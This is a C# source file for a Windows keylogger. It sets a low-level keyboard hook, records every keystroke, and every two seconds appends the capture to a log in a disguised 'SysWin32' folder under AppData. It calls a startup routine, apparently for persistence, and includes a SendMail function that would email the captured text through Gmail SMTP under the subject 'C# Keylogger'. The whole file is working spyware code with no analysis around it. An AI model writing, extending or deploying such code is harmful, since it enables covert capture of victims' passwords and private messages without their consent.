using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Timers;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;
using System.IO;
using ConsoleApp2.NativeMethods;
using ConsoleApp2.Constants;
using ConsoleApp2.Startup;

namespace ConsoleApp1
{
    class Program
    {
        #region variable declarations
        private static IntPtr _hookptr = IntPtr.Zero;
        public enum states
        {
            DEFAULT = -1,
            SHIFT = 0,
            CAPS = 1
        }
        private static states state = states.DEFAULT;
        // size of the keylog buffer
        private static int _bufflen = 0;
        // mail password
        private static string _mailpass = string.Empty;
        // the buffer to which keystrokes will be written
        private static StringBuilder _buffer;
        #endregion

        public static void Main(string[] args)
        {
            if (!Network.IsAvailable()) {
                Terminate("No internet Connection!");
            }

            _hookptr = SetHook(KeyBoardProcCallback);
            _buffer = new StringBuilder();
            // Timer here
            System.Timers.Timer timer = new System.Timers.Timer(2000);
            timer.Elapsed += DispatchKeyLogBuffer;
            timer.Enabled = true;
            timer.AutoReset = true;

            Startup.Init();

            Application.Run();
            NativeMethods.UnhookWindowsHookEx(_hookptr);
        }

        /// <summary>
        ///     Register the LowLevelKeyboardProc callback function
        /// </summary>
        /// <param name="func">The callback function</param>
        /// <returns> Returns the newly created hook procedure </returns>
        public static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc keyboardCallback)
        {
            using (Process proc = Process.GetCurrentProcess()) {
                using (var procModule = proc.MainModule) {
                    return NativeMethods.SetWindowsHookEx(
                        Constants.whl_keyboard_ll, keyboardCallback, NativeMethods.GetModuleHandle(procModule.ModuleName), 0
                    );
                }
            }
        }

        // this is the function thats going to monitor the keyboard and write to the buffer
        public static IntPtr KeyBoardProcCallback(int ncode, IntPtr wParam, IntPtr lParam)
        {
            if( ncode == 0 ) {
                if( wParam == (IntPtr) Constants.wm_keydown ) {
                    int vkey = Marshal.ReadInt32(lParam);
                    char key = Char.ToLower(
                        Convert.ToChar(
                            NativeMethods.MapVirtualKey((uint)vkey, Constants.mapvk_to_char)
                        )
                    );
                    
                    if( state == states.SHIFT ) {
                        if ( KeyMap.keymap.ContainsKey(key) ) {
                            key = KeyMap.keymap[key];
                        }
                        else if (key >= 'A' && key <= 'Z' || key >= 'a' && key <= 'z') {
                            key = Char.ToUpper(key);
                        }
                    }
                    _buffer.Append(key);
                    _bufflen++;
                    Console.Write($"{_buffer}");

                    if ( wParam == (IntPtr) Constants.wm_keyup ) {
                        state = states.DEFAULT;
                    }
                }
            }
            return NativeMethods.CallNextHookEx(_hookptr, ncode, wParam, lParam);
        }

        /// <summary>
        ///     Write the buffer to the file and then after that immediately clears that buffer
        /// </summary>
        /// <returns> Doesn't return a value </returns>
        public static void DispatchKeyLogBuffer(Object obj, ElapsedEventArgs e)
        {
            if( _bufflen <= 0 ) {
                return;
            }
            using( StreamWriter sw = File.AppendText(
                Environment.GetFolderPath(
                    Environment.SpecialFolder.ApplicationData) + @"/SysWin32/logs/log.txt") ) {
                sw.Write(_buffer);
            }
            _buffer.Clear();
            _bufflen = 0;
        }

        private static void SendMail(StringBuilder content, string from, string to)
        {
            MailMessage message = new MailMessage(from, to);
            message.Subject = "C# Keylogger";
            message.Body = content.ToString();
            SmtpClient client = new SmtpClient("smtp.gmail.com");
            client.Port = 587;
            client.Credentials = new NetworkCredential(from, _mailpass);
            client.EnableSsl = true;

            try {
                client.Send(message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception caught in SendMail(): {0}",
                    ex.ToString());
            }
        }

        public static void Terminate(string err)
        {
            Console.WriteLine($"{err}");
            Application.Exit();
        }
    }
}